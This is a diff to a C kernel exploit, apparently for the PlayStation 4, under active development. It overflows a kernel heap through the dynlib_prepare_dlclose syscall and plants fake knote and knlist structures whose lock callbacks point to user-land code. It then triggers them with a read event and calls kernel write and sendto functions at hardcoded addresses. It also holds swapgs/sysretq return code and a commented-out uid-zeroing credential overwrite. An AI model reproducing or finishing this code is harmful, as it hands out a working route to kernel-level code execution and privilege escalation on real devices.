@@ -101,57 +101,91 @@ static int debug;
 
 void shell()
 {
-	printf("shell");
-	fflush(stdout);
+	while(1)
+	{
+		printf("shell\n");
+		fflush(stdout);
+		sleep(1);
+	}
 }
 
 void run(void *arg) // no idea if this user land function is (can?) ever been called by the kernel
 {
-	struct thread *td;
-	//struct ucred *cred;
-
+	char b[128];
+	struct thread *td[32];
 	struct sendto_args sargs;
 	struct write_args wargs;
+	int i;
 
  	sargs.s = debug;
-	sargs.buf = (void *)0xffffffff8247b0f0;
-	sargs.len = 0x1000;
+	sargs.buf = b;
+	sargs.len = 4;
  	sargs.flags = 0;
 	sargs.to = NULL;
 	sargs.tolen = 0;
 
 	wargs.fd = 1;
-	wargs.buf = (void *)0xffffffff8247b0f0;
-	wargs.nbyte = 0x1000;
+	wargs.buf = b;
+	wargs.nbyte = 4;
 
-	__asm__ volatile("movq %%gs:0, %0" : "=r"(td)); // should be, no?
+	__asm__ volatile("mov %%gs:0, %0" : "=r"(td[0]));
+	__asm__ volatile("mov %%gs:1, %0" : "=r"(td[1]));
+	__asm__ volatile("mov %%gs:2, %0" : "=r"(td[2]));
+	__asm__ volatile("mov %%gs:3, %0" : "=r"(td[3]));
+	__asm__ volatile("mov %%gs:4, %0" : "=r"(td[4]));
+	__asm__ volatile("mov %%gs:5, %0" : "=r"(td[5]));
+	__asm__ volatile("mov %%gs:6, %0" : "=r"(td[6]));
+	__asm__ volatile("mov %%gs:7, %0" : "=r"(td[7]));
+	__asm__ volatile("mov %%gs:8, %0" : "=r"(td[8]));
+	__asm__ volatile("mov %%gs:9, %0" : "=r"(td[9]));
+	__asm__ volatile("mov %%gs:10, %0" : "=r"(td[10]));
+	__asm__ volatile("mov %%gs:11, %0" : "=r"(td[11]));
+	__asm__ volatile("mov %%gs:12, %0" : "=r"(td[12]));
+	__asm__ volatile("mov %%gs:13, %0" : "=r"(td[13]));
+	__asm__ volatile("mov %%gs:14, %0" : "=r"(td[14]));
+	__asm__ volatile("mov %%gs:15, %0" : "=r"(td[15]));
 
-/*
-	cred = td->td_proc->p_ucred;
-	cred->cr_uid = cred->cr_ruid = cred->cr_rgid = 0;
-	cred->cr_groups[0] = 0;
 
-	//cred->cr_prison = ; // no good idea to get prison0 either
-*/
+	__asm__ volatile("mov %%gs:16, %0" : "=r"(td[16]));
+	__asm__ volatile("mov %%gs:17, %0" : "=r"(td[17]));
+	__asm__ volatile("mov %%gs:18, %0" : "=r"(td[18]));
+	__asm__ volatile("mov %%gs:19, %0" : "=r"(td[19]));
+	__asm__ volatile("mov %%gs:20, %0" : "=r"(td[20]));
+	__asm__ volatile("mov %%gs:21, %0" : "=r"(td[21]));
+	__asm__ volatile("mov %%gs:22, %0" : "=r"(td[22]));
+	__asm__ volatile("mov %%gs:23, %0" : "=r"(td[23]));
+	__asm__ volatile("mov %%gs:24, %0" : "=r"(td[24]));
+	__asm__ volatile("mov %%gs:25, %0" : "=r"(td[25]));
+	__asm__ volatile("mov %%gs:26, %0" : "=r"(td[26]));
+	__asm__ volatile("mov %%gs:27, %0" : "=r"(td[27]));
+	__asm__ volatile("mov %%gs:28, %0" : "=r"(td[28]));
+	__asm__ volatile("mov %%gs:29, %0" : "=r"(td[29]));
+	__asm__ volatile("mov %%gs:30, %0" : "=r"(td[30]));
+	__asm__ volatile("mov %%gs:31, %0" : "=r"(td[31]));
 
-	while(((SysWrite)0xffffffff8247b0f0)(td, &wargs) == EINTR);
-	while(((SysSendto)0xffffffff8249eba0)(td, &sargs) == EINTR);
-
-	__asm__ volatile("swapgs; sysretq;"::"c"(shell));
+	while(1)
+	{
+		b[0] = '0';
+		b[2] = ' ';
+		b[3] = '\0';
+		for(i = 0; i < 32; ++i)
+		{
+			b[0] = '0' + (i / 10);
+			b[1] = '0' + i;
+			((SysWrite)0xffffffff8247b0f0)(td[i], &wargs);
+			((SysSendto)0xffffffff8249eba0)(td[i], &sargs);
+		}
+	}
 }
 
-void dummy(void *arg)
-{
-	printf("shell");
-	__asm__ volatile("swapgs;");
-	printf("shell");
-	fflush(stdout);
-	sleep(10);
-	__asm__ volatile("swapgs;");
-	//__asm__ volatile("swapgs; sysretq;"::"c"(shell));
-}
+void dummy(void *arg) { }
 
 /*
+	__asm__ volatile("swapgs;");
+	void shell();
+//	__asm__ volatile("swapgs; sysretq;"::"c"(shell));
+}
+
 	__asm__ volatile("swapgs;");
 	printf("bar");
 	fflush(stdout);
@@ -241,19 +275,22 @@ void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t
 
 	knist.kl_list.slh_first = &kote;
 
-	knist.kl_lock = dummy;
-	knist.kl_unlock = knist.kl_assert_locked = knist.kl_assert_unlocked = dummy;
+	knist.kl_lock = knist.kl_unlock = knist.kl_assert_locked = knist.kl_assert_unlocked = run;
 	knist.kl_lockarg = NULL;
 
-	kote.kn_knlist = &knist;
-	kote.kn_link.sle_next = &kote;
+	kote.kn_link.sle_next = NULL;
 	kote.kn_selnext.sle_next = NULL;
-	kote.kn_kevent.ident = fd;
+	kote.kn_knlist = &knist;
+	EV_SET(&kote.kn_kevent, fd, EVFILT_READ, EV_ADD, 0, 5, NULL);
+	kote.kn_sfflags = kote.kn_kevent.fflags;
+	kote.kn_sdata = kote.kn_kevent.data;
+	/*kote.kn_kevent.fflags = 0;
+	kote.kn_kevent.data = 0;*/
 
 	kist = (struct klist *)(map + bufferSize);
-	for(i = 0; i < overflowSize / sizeof(struct klist); ++i)
-		kist[i].slh_first = &kote;
-	//kist[fd].slh_first = &kote;
+	//for(i = 0; i < overflowSize / sizeof(struct klist); ++i)
+	//	kist[i].slh_first = &kote;
+	kist[fd].slh_first = &kote;
 
 	// overflow
 	r = syscall(SYS_dynlib_prepare_dlclose, 1, map, &mapOverflowSize);
@@ -286,19 +323,24 @@ void kexecExploit(size_t intermediateChunkCount, size_t intermediateSize, size_t
 	printf("Pre Trigger\n");
 	fflush(stdout);
 	// trigger + free
+	//sceKernelCreateEqueue(&overflowChunk, "kexec");
 	sceKernelAddReadEvent(overflowChunk, kexecGetGlobalFileDescriptor(), 5, NULL);
-	r = kexecFree(overflowChunk);
+
+
+	//r = kexecFree(overflowChunk);
 	if(r < 0)
 		printf("kexecFree(overflowChunk) = %i\n", r);
 	printf("Post Trigger\n");
 	fflush(stdout);
 
+/*
 	munmap(map, bufferSize); // mapChunkSize - overflowSize
 
 	// close fd for unclosed global allocs
 	r = kexecCloseGlobalIfNeeded();
 	if(r < 0)
 		printf("kexecCloseGlobalIfNeeded() = %i\n", r);
+*/
 }
 
 int main(int argc, char **argv)
